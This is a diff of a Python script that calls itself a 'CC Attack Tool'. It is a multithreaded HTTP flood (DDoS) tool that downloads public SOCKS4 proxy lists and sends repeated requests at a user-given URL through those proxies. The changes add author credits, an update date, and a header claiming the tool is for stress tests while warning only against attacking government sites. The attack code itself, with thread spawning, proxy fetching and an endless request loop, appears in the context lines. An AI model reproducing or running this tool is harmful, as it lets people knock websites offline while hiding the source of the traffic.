@@ -1,3 +1,10 @@
+###########################################
+#	This Script Is Code By GogoZin    #
+#	Can Use In Stress Test            #
+#	But Don't Attack Any Gov Site     #
+#	If Want Me To Keep Update         #
+###########################################
+
 import requests
 import random
 import time
@@ -27,8 +34,11 @@ print(Fore.GREEN + """    	     .,:ccllllc:,.
 """)
 print("  CC Attack Tool Using Requests Module")
 print("      Code By GogoZin. -2019/8/2")
+print("       Last Update In 2019/8/10")
 
-def opth():
+#Code By GogoZin 
+
+def opth(): 
 	for i in range(thr):
 		x = threading.Thread(target=atk)
 		x.start()
@@ -47,7 +57,7 @@ def main():
 	thr = int(input(Fore.BLUE + "Threads : " + Fore.WHITE))
 	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
 	if cho =='y':
-		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000&country=all')
+		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000&country=all') #Code By GogoZin
 		with open('socks.txt','wb') as fp:
 			fp.write(rsp.content)
 			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
@@ -72,7 +82,7 @@ def atk():
 	while True:
 		try:
 			s.get(url)
-			print(Fore.BLUE + "Socks Ddos From ~ [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ]" + Fore.WHITE)
+			print(Fore.BLUE + "Socks Ddos From ~ [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ]" + Fore.WHITE)    #Code By GogoZin
 			try:
 				for y in range(pwr):
 					s.get(url)
